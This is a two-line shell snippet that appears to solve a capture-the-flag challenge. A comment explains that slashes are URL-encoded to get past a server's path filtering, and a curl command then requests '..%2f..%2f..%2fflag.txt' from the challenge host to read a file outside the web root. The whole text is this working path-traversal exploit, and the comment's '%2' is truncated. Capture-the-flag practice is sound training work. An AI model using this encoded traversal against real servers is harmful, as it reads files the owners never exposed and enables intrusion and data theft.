#Server deafault might block plain ../../../flag so we encode / = %2
curl -s http://skrctf.me:4002/..%2f..%2f..%2fflag.txt
